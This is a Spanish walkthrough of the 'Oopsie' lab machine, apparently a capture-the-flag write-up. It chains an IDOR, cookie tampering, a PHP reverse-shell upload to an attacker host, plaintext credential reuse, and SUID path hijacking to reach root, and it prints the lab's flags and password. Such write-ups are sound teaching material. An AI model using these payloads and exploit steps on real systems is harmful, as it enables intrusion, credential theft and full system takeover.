RECONOCIMIENTO — Escaneo de puertos

Se lanza un escaneo completo para descubrir la superficie de ataque disponible en la máquina víctima.

escaneo inicial
nmap -sC -sV -oN oopsie.nmap <IP_VICTIMA>
PUERTO ESTADO SERVICIO VERSIÓN
22/tcp OPEN SSH OpenSSH 7.6p1
80/tcp OPEN HTTP Apache 2.4.29

La superficie es reducida: una web y SSH. Al acceder a http://<IP_VICTIMA> encontramos la página de una empresa de reparación de coches. A simple vista no hay ningún panel de login ni ruta obvia de acceso.

Tarea 1 — ¿Con qué tipo de herramienta se puede interceptar tráfico web?
Respuesta: proxy
// 02

ENUMERACIÓN WEB — Descubriendo el panel de login

Para descubrir rutas ocultas, configuramos Burp Suite como proxy del navegador e interceptamos el tráfico al cargar la página principal. En el Site map de Burp, entre los recursos que la página solicita de forma pasiva, aparece una petición GET a:

/cdn-cgi/login/script.js

Esto delata la existencia del directorio /cdn-cgi/login. Accedemos directamente a esa ruta:

ruta descubierta
http://<IP_VICTIMA>/cdn-cgi/login

Aparece un panel de login con usuario y contraseña, y la opción "Login as Guest".

Tarea 2 — ¿Cuál es la ruta del directorio que devuelve el panel de login?
Respuesta: /cdn-cgi/login
// 03

IDOR — Enumerando el Access ID del administrador

Iniciamos sesión pulsando "Login as Guest". La aplicación nos redirige a:

http://<IP_VICTIMA>/cdn-cgi/login/admin.php?content=accounts&id=2

El parámetro id=2 referencia directamente el registro de nuestra cuenta en la base de datos. Este es el indicador clásico de un IDOR (Insecure Direct Object Reference): el servidor confía ciegamente en el valor del parámetro sin validar que el usuario autenticado tenga permisos para ver ese recurso.

¿Dónde está la vulnerabilidad?
La aplicación expone identificadores numéricos correlativos en la URL. Cualquier usuario autenticado —incluso como invitado— puede leer los datos de cualquier otro usuario simplemente cambiando el valor de id. No existe ningún control de autorización en el servidor.

Cambiamos el parámetro a id=1, ya que el primer usuario registrado suele ser el administrador:

explotación del IDOR
http://<IP_VICTIMA>/cdn-cgi/login/admin.php?content=accounts&id=1
ACCESS IDNAMEEMAIL
34322 admin admin@megacorp.com
Tarea 4 — ¿Cuál es el Access ID del usuario administrador?
Respuesta: 34322

COOKIE HIJACKING — Escalada a administrador

Tarea 3 — ¿Qué se puede modificar en Firefox para acceder a la página de uploads?
Respuesta: cookie

La sesión de usuario en la aplicación se gestiona mediante dos cookies: role y user. Con el Access ID del administrador obtenido por IDOR podemos suplantar su sesión modificando estas cookies desde las DevTools del navegador (F12 → Application → Cookies) o desde Burp Suite.

1
Abrir DevTools → Application → Cookies
Navegamos al panel e inspeccionamos las cookies de sesión actuales correspondientes a la cuenta de invitado.
2
Modificar los valores
Cambiamos role a admin y user a 34322 (el Access ID obtenido por IDOR).
3
Recargar la página
El servidor lee las cookies modificadas, asume que somos el administrador y muestra el panel completo incluyendo la pestaña de Uploads.
COOKIEVALOR ORIGINAL (GUEST)VALOR MODIFICADO
role guest admin
user 2233 34322
¿Por qué funciona?
La aplicación delega el control de permisos en datos que el cliente puede modificar libremente. Al no validar la sesión contra la base de datos en el servidor, cualquier usuario puede otorgarse el rol de administrador simplemente cambiando el valor de una cookie.
// 05

WEB SHELL — Ejecución remota de código

Tarea 5 — Al subir un archivo, ¿en qué directorio aparece en el servidor?
Respuesta: /uploads

Con la sesión de administrador activa, accedemos a la sección de Branding Image Uploads. El formulario permite subir archivos sin validar su tipo ni contenido, lo que nos permite subir directamente una reverse shell en PHP.

shell.php
<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/<IP_ATACANTE>/4444 0>&1'"); ?>

Subimos el fichero shell.php a través del formulario de uploads. Antes de activarla nos ponemos en escucha con netcat en nuestra máquina:

listener en nuestra máquina
nc -lvnp 4444

Activamos la shell navegando a la ruta donde el servidor ha guardado el archivo:

activar la reverse shell
http://<IP_VICTIMA>/uploads/shell.php
conexión recibida
www-data@oopsie:/$ whoami www-data

Estamos dentro del sistema como www-data, el usuario que ejecuta el servidor web Apache.

ESCALADA HORIZONTAL — De www-data a robert

Tarea 6 — ¿Qué archivo contiene la contraseña compartida con el usuario robert?
Respuesta: db.php

Enumeramos el sistema de archivos en busca de credenciales. En el directorio donde reside la aplicación de login encontramos un archivo de configuración de base de datos:

inspección del directorio de login
ls -la /var/www/html/cdn-cgi/login/ cat /var/www/html/cdn-cgi/login/db.php
contenido de db.php
<?php $conn = mysqli_connect('localhost', 'robert', 'M3g4C0rpUs3r!', 'garage'); ?>

Las credenciales de la base de datos están almacenadas en texto plano. El usuario robert reutiliza la misma contraseña para su cuenta del sistema operativo:

cambio de usuario
su robert Password: M3g4C0rpUs3r!
robert@oopsie:~$ cat user.txt f2c74ee8db7983851ab2a96a44eb7981
USER FLAG f2c74ee8db7983851ab2a96a44eb7981

PRIVILEGE ESCALATION — SUID + Path Hijacking

Tarea 7 — ¿Qué ejecutable se usa con "-group bugtracker" para identificar archivos del grupo?
Respuesta: find

Buscamos binarios con el bit SUID activado pertenecientes al grupo bugtracker, del que el usuario robert es miembro:

búsqueda de binarios SUID del grupo bugtracker
find / -group bugtracker -ls 2>/dev/null
resultado
264151 12 -rwsr-xr-- 1 root bugtracker 8792 Jan 25 2020 /usr/bin/bugtracker
Tarea 8 y 9 — SUID y propietario efectivo
La s en los permisos de propietario (-rws) indica el bit SUID (Set owner User ID). Independientemente del usuario que lo ejecute, el binario siempre correrá con los privilegios de su dueño: root.

Ejecutamos el binario para analizar su comportamiento interno:

bugtracker
comportamiento del binario
------------------ : EV Bug Tracker : ------------------ Provide Bug ID: 12 -------------- cat: /root/reports/12: No such file or directory

El binario llama al comando cat usando una ruta relativa en lugar de la ruta absoluta /bin/cat. Para resolver qué ejecutable usar, el sistema busca en los directorios del $PATH de izquierda a derecha y utiliza el primero que encuentre.

¿Dónde está la vulnerabilidad?
Un binario SUID que invoca comandos sin ruta absoluta es vulnerable a path hijacking: si controlamos el $PATH, podemos engañar al binario (que se ejecuta como root) para que llame a un cat malicioso nuestro en lugar del legítimo del sistema.
Tarea 10 — ¿Qué ejecutable se llama de forma insegura?
Respuesta: cat

Explotamos la vulnerabilidad en tres pasos:

1
Crear el cat malicioso en /tmp
Escribimos un script que lance una bash con el flag -p, que preserva el EUID (effective UID). Al ejecutarse como root, la bash heredará esos privilegios.
2
Inyectar /tmp al inicio del PATH
Al colocar /tmp antes que /usr/bin y /bin en el PATH, el sistema encontrará primero nuestro cat falso cuando bugtracker lo busque.
3
Ejecutar bugtracker
El binario SUID (corriendo como root) busca cat, lo encuentra en /tmp y lo ejecuta con privilegios de root, entregándonos una shell privilegiada.
explotación completa
cd /tmp # 1. Crear el cat malicioso echo '#!/bin/bash' > cat echo '/bin/bash -p' >> cat chmod +x cat # 2. Inyectar /tmp al inicio del PATH export PATH=/tmp:$PATH # 3. Lanzar el binario SUID bugtracker
resultado
------------------ : EV Bug Tracker : ------------------ Provide Bug ID: 12 -------------- root@oopsie:/tmp# whoami root

Tenemos shell de root. Leemos la flag usando la ruta absoluta de cat para no volver a invocar nuestro script malicioso:

/bin/cat /root/root.txt
ROOT FLAG af13b0bee69f8a877c3faf667f7beacf

CADENA DE ATAQUE

01
Enumeración con Burp Suite
El tráfico pasivo interceptado por Burp revela la ruta oculta /cdn-cgi/login con el panel de login de la aplicación.
02
IDOR → Access ID del admin
Cambiando id=2 a id=1 en la URL se filtra el Access ID 34322 del administrador sin ningún control de autorización.
03
Cookie Hijacking → panel admin
Modificando role=admin y user=34322 en las cookies, el servidor concede acceso completo al panel de administración con la sección de uploads.
04
Web Shell PHP → RCE como www-data
El uploader no valida el tipo de archivo. Se sube shell.php y se accede a /uploads/shell.php para obtener una reverse shell en el servidor.
05
Credenciales en db.php → usuario robert
db.php expone la contraseña de la base de datos en texto plano. Robert reutiliza esa misma contraseña para su cuenta del sistema.
⚡
Path Hijacking SUID → Root
El binario bugtracker (SUID root) invoca cat por ruta relativa. Creando un cat malicioso en /tmp e inyectándolo al PATH se obtiene una shell de root.
